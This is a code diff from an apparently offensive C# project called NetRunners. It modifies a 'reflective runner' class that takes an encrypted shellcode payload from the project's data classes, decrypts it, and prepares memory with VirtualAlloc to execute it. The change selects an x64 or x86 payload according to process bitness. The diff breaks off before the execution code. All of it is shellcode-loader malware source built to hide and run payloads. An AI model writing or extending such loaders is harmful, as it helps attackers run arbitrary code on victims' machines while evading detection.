@@ -1,9 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
-using System.Diagnostics;
 using static NetRunners.DecryptionAlgorithms.Decryptor;
 using static NetRunners.Data.Delegates;
-using static NetRunners.Data.Structures;
 using static NetRunners.Data.EncryptedData;
 
 namespace NetRunners.Runners
@@ -13,13 +11,23 @@ namespace NetRunners.Runners
     /// Retrieves encrypted payload from Shellcode class.
     /// Retrieves win32 apis from Win32APIs class, retrieves needed structures from Structures class.
     /// </summary>
-    class Runner
+    public static class Runner
     {
-        static byte[] buf = Data.EncryptedData.buf;
-        static int sBuf = Data.EncryptedData.sBuf;       // decrypted buf size
+        //static byte[] buf = Data.EncryptedData.buf;
+        //static int sBuf = Data.EncryptedData.sBuf;       // decrypted buf size
+
         // Basic Reflective Runner
         public static void Run()
         {
+            // define buf var using bitness
+            byte[] buf = (System.Environment.Is64BitProcess) ?
+                Data.EncryptedData.buf  :                             // x64 payload
+                Data.EncryptedData.buf86;                            // x86 payload
+            // define sbuf var using bitness
+            int sBuf = (System.Environment.Is64BitProcess) ?
+                Data.EncryptedData.sBuf :                             // x64 payload
+                Data.EncryptedData.sBuf86;                            // x86 payload
+
             try
             {
                 // call virtual alloc to allocate memory space here
